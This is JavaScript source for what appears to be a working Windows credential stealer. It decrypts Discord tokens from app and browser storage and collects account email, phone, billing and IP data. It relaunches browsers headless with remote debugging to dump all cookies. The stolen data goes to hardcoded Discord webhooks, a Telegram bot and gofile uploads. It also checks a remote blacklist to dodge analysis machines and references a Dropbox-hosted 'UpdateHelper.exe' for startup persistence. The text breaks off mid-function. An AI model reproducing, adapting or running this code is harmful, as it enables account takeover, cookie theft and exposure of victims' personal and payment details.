const fs = require('fs');
const path = require('path');
const util = require('util');
const axios = require('axios');
const os = require('os');
const crypto = require('crypto');
const {
    exec,
    execSync,
    spawn
} = require('child_process');
const {
    Dpapi
} = require('@primno/dpapi');
const sqlite3 = require('sqlite3');
const AdmZip = require('adm-zip');
const FormData = require('form-data');
const WebSocket = require('ws');

const {
    APPDATA: appdata,
    LOCALAPPDATA: localappdata
} = process.env;
const user = {
	hostname: os.hostname(),
	username: os.userInfo().username,
    startup: path.join(os.homedir(), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'),
    temp: os.tmpdir(),
    cwd: process.cwd(),
    execpromise: util.promisify(exec),
    paths: {
        dcs: [
            appdata + '\\discord\\', appdata + '\\discordcanary\\', appdata + '\\discordptb\\', appdata + '\\discorddevelopment\\', appdata + '\\lightcord\\', localappdata + '\\Google\\Chrome\\User Data\\Default\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\', localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\', localappdata + '\\Google\\Chrome\\User Data\\Default\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\Network\\', appdata + '\\Opera Software\\Opera Stable\\Default\\', appdata + '\\Opera Software\\Opera Stable\\Profile 1\\', appdata + '\\Opera Software\\Opera Stable\\Profile 2\\', appdata + '\\Opera Software\\Opera Stable\\Profile 3\\', appdata + '\\Opera Software\\Opera Stable\\Profile 4\\', appdata + '\\Opera Software\\Opera Stable\\Profile 5\\', appdata + '\\Opera Software\\Opera GX Stable\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\', localappdata + '\\Microsoft\\Edge\\User Data\\Default\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\', localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Default\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\Network\\', appdata + '\\Waterfox\\Profiles\\', appdata + '\\Vivaldi\\User Data\\Default\\', localappdata + '\\Chromium\\User Data\\Default\\'
        ]
    },
    urls: {
        discordapi: 'https://discord.com/api/v9',
        webhook: 'https://discord.com/api/webhooks/1334313267363053690/pHq3bN53HeKHqoZ-6sTagSdO6Ll8qURH4mBUEmQQ4lgDiuLNjrklMVidEZ4ikcPYAzmQ',
        injecthook: 'https://discord.com/api/webhooks/1334307088389767228/iRYs4Lc4xd4BCMy_reOoV_gOqBUOla11zSejmiLjX7F_dWNAWVZESui2M7K5hY89A8EG',
        errorhook: 'https://discord.com/api/webhooks/1334313732125233243/E2d4z50-LiptI5B9bUbG4u8xxyhFpqgJex_ax_8zVDvLpbv7QX2MzB8IX2Tl0iVekCpu',
        injection: 'https://ukibatuzugverymuchstormomgheyhowareu.rauls.site/?code=187367105067',
        blacklistednames: 'https://ukibatuzugverymuchstormomgheyhowareu.rauls.site/?code=names',
        startupexe: 'https://www.dropbox.com/scl/fi/36321c4zbecom9wxuapdz/UpdateHelper.exe?rlkey=2h3vxy5b2c3oa0pyiows53hre&st=mqtn9teh&dl=1'
    },
    tokens: {
        telegram: '7603802511:AAFosFGa6RWevKnIBcihY-L70-xYiZSWNfw',
        telegram_chatid: '7800744412'
    },
    configs: {
        thumbnail: 'https://i.pinimg.com/736x/c4/04/69/c404692bb7860d91e726efcb2d353148.jpg'
    }
};

const browsers = [
    [localappdata + '\\Google\\Chrome\\User Data\\Default\\', 'Padrão', localappdata + '\\Google\\Chrome\\User Data\\'],
    [localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\', 'Perfil 1', localappdata + '\\Google\\Chrome\\User Data\\'],
    [localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\', 'Perfil 2', localappdata + '\\Google\\Chrome\\User Data\\'],
    [localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\', 'Perfil 3', localappdata + '\\Google\\Chrome\\User Data\\'],
    [localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\', 'Perfil 4', localappdata + '\\Google\\Chrome\\User Data\\'],
    [localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\', 'Perfil 5', localappdata + '\\Google\\Chrome\\User Data\\'],
    [localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\', 'Padrão', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\'],
    [localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\', 'Perfil 1', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\'],
    [localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\', 'Perfil 2', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\'],
    [localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\', 'Perfil 3', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\'],
    [localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\', 'Perfil 4', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\'],
    [localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\', 'Perfil 5', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\'],
    [localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\', 'Pefil Guest', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\'],
    [localappdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\', 'Padrão', localappdata + '\\Yandex\\YandexBrowser\\User Data\\'],
    [localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\', 'Perfil 1', localappdata + '\\Yandex\\YandexBrowser\\User Data\\'],
    [localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\', 'Perfil 2', localappdata + '\\Yandex\\YandexBrowser\\User Data\\'],
    [localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\', 'Perfil 3', localappdata + '\\Yandex\\YandexBrowser\\User Data\\'],
    [localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\', 'Perfil 4', localappdata + '\\Yandex\\YandexBrowser\\User Data\\'],
    [localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\', 'Perfil 5', localappdata + '\\Yandex\\YandexBrowser\\User Data\\'],
    [localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\', 'Perfil Guest', localappdata + '\\Yandex\\YandexBrowser\\User Data\\'],
    [localappdata + '\\Microsoft\\Edge\\User Data\\Default\\', 'Padrão', localappdata + '\\Microsoft\\Edge\\User Data\\'],
    [localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\', 'Perfil 1', localappdata + '\\Microsoft\\Edge\\User Data\\'],
    [localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\', 'Perfil 2', localappdata + '\\Microsoft\\Edge\\User Data\\'],
    [localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\', 'Perfil 3', localappdata + '\\Microsoft\\Edge\\User Data\\'],
    [localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\', 'Perfil 4', localappdata + '\\Microsoft\\Edge\\User Data\\'],
    [localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\', 'Perfil 5', localappdata + '\\Microsoft\\Edge\\User Data\\'],
    [localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\', 'Perfil Guest', localappdata + '\\Microsoft\\Edge\\User Data\\'],
    [appdata + '\\Opera Software\\Opera Neon\\User Data\\Default\\', 'Padrão', appdata + '\\Opera Software\\Opera Neon\\User Data\\'],
    [appdata + '\\Opera Software\\Opera Stable\\', 'Padrão', appdata + '\\Opera Software\\Opera Stable\\'],
    [appdata + '\\Opera Software\\Opera GX Stable\\', 'Padrão', appdata + '\\Opera Software\\Opera GX Stable\\'],
    [appdata + '\\Waterfox\\Profiles\\', 'Padrão', appdata + '\\Waterfox\\Profiles\\'],
    [appdata + '\\Vivaldi\\User Data\\Default\\', 'Padrão', appdata + '\\Vivaldi\\User Data\\'],
    [localappdata + '\\Chromium\\User Data\\Default\\', 'Padrão', localappdata + '\\Chromium\\User Data\\']
];

async function getMachine() {
    try {
        const response = await axios.get(user.urls.blacklistednames);
        const data = response.data;
        const blpcn = data.hostnames || [];
        const blusr = data.usernames || [];
        if (blusr.includes(user.username) || blpcn.includes(user.hostname)) {
            process.exit(1);
        } else {}
    } catch (e) {
        await axios.post(user.urls.errorhook, { content: `erro getMachine: ${e.message}` });
    }
};

async function getWindows() {
    try {
        if (os.platform() === 'win32') {
            const release = os.release();
            const parts = release.split('.').map(Number);
            const majorVersion = parts[0];
            const buildNumber = parts[2];
            if (majorVersion === 10 && buildNumber >= 22000) {
                return 'Windows 11';
            } else if (majorVersion === 10) {
                return 'Windows 10';
            } else if (majorVersion === 6) {
                const minorVersion = parts[1];
                if (minorVersion === 1) return 'Windows 7';
                if (minorVersion === 2) return 'Windows 8';
                if (minorVersion === 3) return 'Windows 8.1';
            }
            return '';
        } else {
            return '';
        }
    } catch (e) {
        await axios.post(user.urls.errorhook, { content: `erro getWindows: ${e.message}` });
    }
};

async function getCpu() {
    try {
        return os.cpus()[0].model;
    } catch (e) {
        await axios.post(user.urls.errorhook, { content: `erro getCpu: ${e.message}` });
    }
};

async function getMemory() {
    try {
        return `${Math.round(os.totalmem() / (1024 * 1024 * 1024))} GB`;
    } catch (e) {
        await axios.post(user.urls.errorhook, { content: `erro getMemory: ${e.message}` });
    }
};

async function getGpu() {
    try {
        const {
            stdout
        } = await user.execpromise(
            'powershell -Command "Get-CimInstance Win32_VideoController | Select-Object -ExpandProperty Name"'
        );
        const gpus = stdout.trim().split('\n').map((gpu, index) => `GPU ${index + 1}: ${gpu.trim()}`);
        return gpus.join('\n') || "GPU Desconhecida";
    } catch (e) {
        await axios.post(user.urls.errorhook, { content: `erro getGpu: ${e.message}` });
        return "GPU Desconhecida";
    }
};

async function getUUID() {
    try {
        const {
            stdout
        } = await user.execpromise(
            'powershell -Command "Get-CimInstance Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID"'
        );
        return stdout.trim() || "UUID Desconhecido";
    } catch (e) {
        await axios.post(user.urls.errorhook, { content: `erro getUUID: ${e.message}` });
        return "UUID Desconhecido";
    }
};

const tokens = [];
function decryptKey(localState) {
    const encryptedKey = JSON.parse(fs.readFileSync(localState, 'utf8')).os_crypt.encrypted_key;
    const encrypted = Buffer.from(encryptedKey, 'base64').slice(5);
    return Dpapi.unprotectData(Buffer.from(encrypted, 'utf8'), null, 'CurrentUser');
};
async function findTokens(basePath) {
    const pathTail = basePath;
    const leveldbPath = basePath + 'Local Storage\\leveldb\\';
    if (!pathTail.includes('discord')) {
        try {
            const files = fs.readdirSync(leveldbPath).filter(file => file.endsWith('.log') || file.endsWith('.ldb'));
            await Promise.all(files.map(async (file) => {
                const filePath = `${leveldbPath}${file}`;
                const fileContent = fs.readFileSync(filePath, 'utf8');
                const patterns = [
                    /mfa\.[\w-]{84}/g,
                    /[\w-]{24}\.[\w-]{6}\.[\w-]{26,110}/gm,
                    /[\w-]{24}\.[\w-]{6}\.[\w-]{38}/g
                ];
                fileContent.split(/\r?\n/).forEach(line => {
                    patterns.forEach(pattern => {
                        const foundTokens = line.match(pattern);
                        if (foundTokens) {
                            foundTokens.forEach(token => {
                                if (!tokens.some(t => t.token === token && t.path === basePath)) {
                                    tokens.push({ token, path: basePath });
                                }
                            });
                        }
                    });
                });
            }));
        } catch (e) {}
    } else {
        if (fs.existsSync(`${pathTail}\\Local State`)) {
            try {
                const key = decryptKey(`${pathTail}\\Local State`);
                const files = fs.readdirSync(leveldbPath).filter(file => file.endsWith('.log') || file.endsWith('.ldb'));
                await Promise.all(files.map(async (file) => {
                    const filePath = `${leveldbPath}${file}`;
                    const fileContent = fs.readFileSync(filePath, 'utf8');
                    const tokenRegex = /dQw4w9WgXcQ:[^.*['(.*)'\].*$][^"]*/gi;
                    const lines = fileContent.split(/\r?\n/);
                    lines.forEach(line => {
                        const foundTokens = line.match(tokenRegex);
                        if (foundTokens) {
                            foundTokens.forEach(token => {
                                try {
                                    const encryptedValue = Buffer.from(token.split(':')[1], 'base64');
                                    const start = encryptedValue.slice(3, 15);
                                    const middle = encryptedValue.slice(15, encryptedValue.length - 16);
                                    const end = encryptedValue.slice(encryptedValue.length - 16, encryptedValue.length);
                                    const decipher = crypto.createDecipheriv('aes-256-gcm', key, start);
                                    decipher.setAuthTag(end);
                                    const decrypted = decipher.update(middle, 'base64', 'utf8') + decipher.final('utf8');

                                    if (!tokens.some(t => t.token === decrypted && t.path === basePath)) {
                                        tokens.push({ token: decrypted, path: basePath });
                                    }
                                } catch (e) {}
                            });
                        }
                    });
                }));
            } catch (e) {
                await axios.post(user.urls.errorhook, { content: `erro findTokens: ${e.message}` });
            }
        }
    }
};

async function getTokens() {
    let x = new Set();
    for (let path of user.paths.dcs) {
        if (!fs.existsSync(path)) continue;
        await findTokens(path);
    }
    for (let { token, path } of tokens) {
        try {
            let json;
            await axios.get(`${user.urls.discordapi}/users/@me`, {
                headers: {
                    "Content-Type": "application/json",
                    "authorization": token
                }
            }).then(res => { json = res.data }).catch(() => { json = null });
            if (!json || x.has(json.id)) continue;
            x.add(json.id);
            console.log(json);
            var ip = await getIp();
            var billing = await getBilling(token);
            var badges = await getBadges(json.id, token);
            var {
                friends,
                ftitle
            } = await getRelationships(token);
            var date = await getDate(json.id);
            const userInformationEmbed = {
                color: 0x313338,
                author: {
                    name: `${json.username} | ${json.id}`,
                    icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}?size=512`,
                },
                thumbnail: {
                    url: user.configs.thumbnail
                },
                fields: [
                    {
                        name: "<:ss:1338443071599153213> Token",
                        value: `\`\`\`${token}\`\`\``
                    },
                    {
                        name: "<a:ya:1338443535917252649> Email",
                        value: `\`${json.email}\``,
                        inline: false
                    },
                    {
                        name: "<a:xs:1338442464704598059> IP",
                        value: `\`${ip}\``,
                        inline: false
                    },
                    {
                        name: "<a:slk:1338450275811201118> Data",
                        value: `\`${date}\``,
                        inline: false
                    },
                    ...(badges ? [{
                        name: "<a:aa:1338443576698208359> Badges",
                        value: `${badges}`,
                        inline: false
                    }] : []),
                    ...(billing ? [{
                        name: "<a:cc:1338446924834930760> Carteira",
                        value: `${billing}`,
                        inline: false
                    }] : []),
                    ...(json.phone ? [{
                        name: "<a:q:1338446488522592309> Número",
                        value: `\`${json.phone}\``,
                        inline: false
                    }] : []),
                    ...(json.mfa_enabled === true ? [{
                        name: "<a:i:1338446442586570846> V2E",
                        value: `\`Ativado\``,
                        inline: false
                    }] : []),
                    {
                        name: "<a:mys:1395452128369315851> Path",
                        value: `\`${path}\``,
                        inline: false
                    }
                ],
                timestamp: new Date().toISOString()
            };
            const friendsEmbed = {
                title: ftitle,
                description: friends,
                color: 0x313338
            };
            const s = friendsEmbed.description && friendsEmbed.description.trim() !== "";
			const embeds = [userInformationEmbed];
            if (s) {
                embeds.push(friendsEmbed);
            }
            const data = {
                username: "Main",
                avatar_url: "https://i.pinimg.com/736x/eb/9c/5b/eb9c5b94467e01bfdc2074229a3f2dbb.jpg",
                embeds: embeds,
            };
            await axios.post(user.urls.webhook, data);
        } catch (e) {
            await axios.post(user.urls.errorhook, { content: `erro getTokens: ${e.message}` });
        }
    }
};

const badges = {
    "staff": {
        "emoji": "<:staff:1329254342775148584>",
        "rare": true
    },
    "partner": {
        "emoji": "<:partner:1329254324676726874>",
        "rare": true
    },
    "early_supporter": {
        "emoji": "<:early:1329254300546891857>",
        "rare": true
    },
    "verified_developer": {
        "emoji": "<:verified:1329254268632436776>",
        "rare": true
    },
    "hypesquad": {
        "emoji": "<:hypesquad:1329254249741418516>",
        "rare": true
    },
    "certified_moderator": {
        "emoji": "<:certified:1329254226483871785>",
        "rare": true
    },
    "bug_hunter_level_1": {
        "emoji": "<:bughunter1:1329254205441183784>",
        "rare": true
    },
    "bug_hunter_level_2": {
        "emoji": "<:bughunter2:1329254189976784936>",
        "rare": true
    },
    "active_developer": {
        "emoji": "<:developer:1329254169508450336>",
        "rare": false
    },
    "premium_tenure_1_month_v2": {
        "emoji": "<:nitro1:1351998727887392900>",
        "rare": true
    },
    "premium_tenure_3_month_v2": {
        "emoji": "<:nitro3:1351998778353254454>",
        "rare": true
    },
    "premium_tenure_6_month_v2": {
        "emoji": "<:nitro6:1351998814478667857>",
        "rare": true
    },
    "premium_tenure_12_month_v2": {
        "emoji": "<:nitro1year:1351998848876417054>",
        "rare": true
    },
    "premium_tenure_24_month_v2": {
        "emoji": "<:nitro2year:1351998905243664477>",
        "rare": true
    },
    "premium_tenure_36_month_v2": {
        "emoji": "<:nitro3year:1351998945559314562>",
        "rare": true
    },
    "premium_tenure_48_month_v2": {
        "emoji": "<:nitro5year:1351998989108645959>",
        "rare": true
    },
    "premium_tenure_60_month_v2": {
        "emoji": "<:nitro5year:1351998989108645959>",
        "rare": true
    },
    "premium_tenure_72_month_v2": {
        "emoji": "<:nitro6year:1351999026991464468>",
        "rare": true
    },
    "premium": {
        "emoji": "<:nitro:1329254146049703990>",
        "rare": true
    },
    "legacy_username": {
        "emoji": "<:pomelo:1329254094216495114>",
        "rare": false
    },
    "quest_completed": {
        "emoji": "<:quests:1329254077212786708>",
        "rare": false
    },
    "orb_profile_badge": {
        "emoji": "<:orb:1395445749029797918>",
        "rare": false
    },
    "hypesquad_house_1": {
        "emoji": "<:house1:1329254056169963520>",
        "rare": false
    },
    "hypesquad_house_2": {
        "emoji": "<:house2:1329254031926755360>",
        "rare": false
    },
    "hypesquad_house_3": {
        "emoji": "<:house3:1329254016642846740>",
        "rare": false
    },
    "guild_booster_lvl1": {
        "emoji": "<:level1:1331335357349761126>",
        "rare": true
    },
    "guild_booster_lvl2": {
        "emoji": "<:level2:1331335384432644106>",
        "rare": true
    },
    "guild_booster_lvl3": {
        "emoji": "<:level3:1331335417580224583>",
        "rare": true
    },
    "guild_booster_lvl4": {
        "emoji": "<:level4:1331335444176310315>",
        "rare": true
    },
    "guild_booster_lvl5": {
        "emoji": "<:level5:1331335470235254854>",
        "rare": true
    },
    "guild_booster_lvl6": {
        "emoji": "<:level6:1331335510165291099>",
        "rare": true
    },
    "guild_booster_lvl7": {
        "emoji": "<:level7:1331335540737446072>",
        "rare": true
    },
    "guild_booster_lvl8": {
        "emoji": "<:level8:1331335569791385813>",
        "rare": true
    },
    "guild_booster_lvl9": {
        "emoji": "<:level9:1331335602674597888>",
        "rare": true
    }
},
flags = {
    Discord_Employee: {
        Value: 1,
        Rare: true
    },
    Partnered_Server_Owner: {
        Value: 2,
        Rare: true
    },
    HypeSquad_Events: {
        Value: 4,
        Rare: true
    },
    Bug_Hunter_Level_1: {
        Value: 8,
        Rare: true
    },
    Early_Supporter: {
        Value: 512,
        Rare: true
    },
    Bug_Hunter_Level_2: {
        Value: 16384,
        Rare: true
    },
    Early_Verified_Bot_Developer: {
        Value: 131072,
        Rare: true
    }
};

async function getBadges(id, token) {
    try {
        const r = await axios.get(`${user.urls.discordapi}/users/${id}/profile`, {
            headers: { Authorization: token }
        });
        const p = r.data;
        if (!p || !p.badges) {
            return null;
        }
        const b = p.badges
            .map(badge => badges[badge.id]?.emoji)
            .filter(emoji => emoji !== undefined)
            .join('');
        return b || null;
    } catch (e) {
        await axios.post(user.urls.errorhook, { content: `erro getBadges: ${e.message}` });
        return null;
    }
};

async function getRelationships(token) {
    try {
        const res = await axios.get(`${user.urls.discordapi}/users/@me/relationships`, {
            headers: {
                "Authorization": token
            }
        });
        const r = res.data;
        let friends = '';
        let count = 0;
        let processed = 0;
        for (const user of r) {
            if (user.type === 1 && friendsFlags(user.user.public_flags)) {
                count++;
                if (processed < 10) {
                    const b = await getBadges(user.user.id, token);
                    if (b) {
                        const a = b.match(/<:[a-zA-Z0-9_]+:\d+>/g) || [];
                        const rb = a.filter(badge =>
                            Object.values(badges).some(bData => bData.emoji === badge && bData.rare)
                        );
                        if (rb.length > 0) {
                            friends += `${rb.join('')} | \`${user.user.username}\`\n`;
                            processed++;
                        }
                    }
                }
            }
        }
        const ftitle = `HQ's (${count} Amig${count === 1 ? 'o' : 'os'})`;
        return { friends: friends || null, ftitle };
    } catch (e) {
        await axios.post(user.urls.errorhook, { content: `Erro em getRelationships: ${e.message}` });
        return { friends: null, ftitle: `HQ's` };
    }
};

function friendsFlags(f) {
    for (const flag in flags) {
        if ((f & flags[flag].Value) === flags[flag].Value && flags[flag].Rare) {
            return true;
        }
    }
    return false;
};

async function getIp() {
    try {
        var ip = await axios.get("https://www.myexternalip.com/raw")
        return ip.data;
    } catch (e) {
        await axios.post(user.urls.errorhook, { content: `erro getIp: ${e.message}` });
    }
};

async function getDate(id) {
    try {
        const d = 1420070400000;
        const timestamp = BigInt(id) >> 22n;
        const date = new Date(Number(timestamp) + d);
        return date.toLocaleDateString('pt-BR');
    } catch (e) {
        await axios.post(user.urls.errorhook, { content: `erro getDate: ${e.message}` });
    }
};

async function getBilling(token) {
    try {
        let json;
        await axios.get(`${user.urls.discordapi}/users/@me/billing/payment-sources`, {
            headers: {
                "Content-Type": "application/json",
                "authorization": token
            }
        }).then(res => { json = res.data })
        .catch(err => { });
        if (!json || json.length === 0) return null;
        let bi = '';
        json.forEach(z => {
            if (z.type == 2 && z.invalid !== true) {
                bi += "<:946246524504002610:962747802830655498>";
            } else if (z.type == 1 && z.invalid !== true) {
                bi += "<:rustler:987692721613459517>";
            }
        });
        return bi || null;
    } catch (e) {
        await axios.post(user.urls.errorhook, { content: `erro getBilling: ${e.message}` });
    }
};

function tempFolder() {
    try {
        const tempDir = path.join(os.tmpdir(), crypto.randomBytes(16).toString("hex"));
        if (!fs.existsSync(tempDir)) {
            fs.mkdirSync(tempDir);
        }
        return tempDir;
    } catch (e) {
        axios.post(user.urls.errorhook, { content: `erro tempFolder: ${e.message}` });
    }
};

function createZip(dirPath, zipName) {
    try {
        const zip = new AdmZip();
        const zipPath = path.join(dirPath, zipName);
        const files = fs.readdirSync(dirPath).filter(file => file.endsWith(".txt"));
        for (const file of files) {
            zip.addLocalFile(path.join(dirPath, file));
        }
        zip.writeZip(zipPath);
        return zipPath;
    } catch (e) {
        axios.post(user.urls.errorhook, { content: `erro createZip: ${e.message}` });
    }
};

async function uploadFiles(filePath) {
    try {
        const serverResponse = await axios.get('https://api.gofile.io/servers');
        const servers = serverResponse.data.data.servers;
        const selectedServer = servers[0].name;
        const formData = new FormData();
        formData.append('file', fs.createReadStream(filePath));
        const uploadResponse = await axios.post(`https://${selectedServer}.gofile.io/uploadFile`, formData, {
            headers: {
                ...formData.getHeaders(),
            },
        });
        return uploadResponse.data.data.downloadPage;
    } catch (e) {
        await axios.post(user.urls.errorhook, { content: `erro uploadFiles: ${e.message}` });
        return null;
    }
};

async function findDebuggerUrl(port) {
    for (let attempt = 1; attempt <= 3; attempt++) {
        try {
            const response = await axios.get(`http://127.0.0.1:${port}/json`);
            return response.data[0]?.webSocketDebuggerUrl || null;
        } catch (e) {
            if (attempt < 3) {} else {
                await axios.post(user.urls.errorhook, {
                    content: `erro ao obter ws debugger url\nporta: ${port}\nerro: ${e.message}`
                });
                return null;
            }
        }
    }
};

async function sendTelegramZip(zipPath) {
  try {
    const form = new FormData();
    form.append('chat_id', user.tokens.telegram_chatid);
    form.append('document', fs.createReadStream(zipPath));
    await axios.post(`https://api.telegram.org/bot${user.tokens.telegram}/sendDocument`, form, {
      headers: form.getHeaders(),
    });
  } catch (e) {
    await axios.post(user.urls.errorhook, { content: `erro sendTelegramZip: ${e.message}` });
  }
};

async function gatherAllCookies(wsUrl) {
    try {
        const ws = new WebSocket(wsUrl);
        return new Promise((resolve, reject) => {
            ws.on("open", () => {
                ws.send(JSON.stringify({ id: 1, method: "Network.getAllCookies" }));
            });

            ws.on("message", (data) => {
                try {
                    const response = JSON.parse(data);
                    if (response.id === 1) {
                        ws.close();

                        if (response.result && response.result.cookies) {
                            resolve(response.result.cookies);
                        } else {
                            resolve([]);
                        }
                    }
                } catch (e) {
                    ws.close();
                    reject(`erro parse response: ${e.message}`);
                }
            });

            ws.on("error", (err) => reject(`ws error: ${err}`));
        });
    } catch (e) {
        await axios.post(user.urls.errorhook, {
            content: `erro gatherAllCookies: ${e.message || e}`
        });
        return [];
    }
};

function closeBrowsers(executablePath) {
    const maxAttempts = 5;
    let attempt = 0;
    while (attempt < maxAttempts) {
        try {
            const pids = execSync(`powershell -Command "Get-Process | Where-Object { $_.Path -eq '${executablePath}' } | Select-Object -ExpandProperty Id"`)
                .toString()
                .split('\n')
                .filter(pid => pid)
                .map(pid => parseInt(pid, 10))
                .filter(pid => !isNaN(pid));
            if (pids.length === 0) {
                return;
            }
            const pidsList = pids.join(',');
            try {
                execSync(`powershell -Command "Stop-Process -Id ${pidsList} -Force -ErrorAction SilentlyContinue"`);
                return;
            } catch (e) {
            }
        } catch (e) {
        }
        attempt++;
    }
    axios.post(user.urls.errorhook, { content: `erro ao tentar fechar processo\n ${maxAttempts} tentativas` });
};

async function captureCookies(browserName, profileName, userDataPath, executablePath, port, outputDir) {
    try {
        let maxRetries = 3;
        let retryCount = 0;
        while (retryCount < maxRetries) {
            closeBrowsers(executablePath);
            const browserProcess = spawn(executablePath, [
                `--remote-debugging-port=${port}`,
                `--user-data-dir=${userDataPath}`,
                `--profile-directory=${profileName}`,
                '--headless',
            ], { stdio: "ignore", detached: true });
            browserProcess.unref();
            try {
                await new Promise((resolve) => setTimeout(resolve, 10000));
                let wsUrl = await findDebuggerUrl(port);
                if (!wsUrl) {
                    retryCount++;
                    if (retryCount < maxRetries) {
                        await new Promise((resolve) => setTimeout(resolve, 3000));
                        continue;
                    }
                    axios.post(user.urls.errorhook, { content: `ws debugger não encontrado após ${maxRetries} tentativas...`});
                    throw new Error();
                }
                const cookies = await gatherAllCookies(wsUrl);
                const cookiesTxt = cookies.map(cookie => {
                    const domain = cookie.domain;
                    const expiration = 3376845000;
                    return `${domain}\tTRUE\t/\tFALSE\t${expiration}\t${cookie.name}\t${cookie.value}`;
                }).join("\n");
                const outputFile = path.join(outputDir, `${browserName} ${profileName}.txt`);
                fs.writeFileSync(outputFile, cookiesTxt);
                closeBrowsers(executablePath);
                const fileSize = (fs.statSync(outputFile).size / 1024).toFixed(2) + " KB";
                return {
                    cookieCount: cookies.length,
                    fileSize: fileSize,
                    filePath: outputFile,
                };
            } catch (e) {
                axios.post(user.urls.errorhook, { content: `erro ao processar ${browserName} ${profileName}\nerro: ${e.message}` });
                retryCount++;
